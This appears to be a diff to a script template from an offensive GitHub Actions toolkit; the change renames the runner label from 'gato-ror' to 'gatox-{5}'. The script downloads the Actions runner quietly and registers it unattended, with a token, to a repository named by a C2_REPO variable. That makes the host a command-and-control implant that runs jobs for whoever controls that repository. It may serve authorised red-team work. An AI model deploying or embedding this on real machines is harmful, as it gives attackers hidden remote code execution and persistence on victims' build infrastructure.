@@ -78,7 +78,7 @@ KEEP_ALIVE={4}
 mkdir -p $HOME/runner/.actions-runner/ && cd $HOME/runner/.actions-runner/
 curl -o {2} -L https://github.com/actions/runner/releases/download/{3}/{2} > /dev/null 2>&1
 tar xzf ./{2}
-./config.sh --url https://github.com/$C2_REPO --unattended --token $REG_TOKEN --name "gato-ror" --labels "gato-ror" > /dev/null 2>&1
+./config.sh --url https://github.com/$C2_REPO --unattended --token $REG_TOKEN --name "gatox-{5}" --labels "gatox-{5}" > /dev/null 2>&1
 rm {2}
 
 if [ "$KEEP_ALIVE" = true ]; then
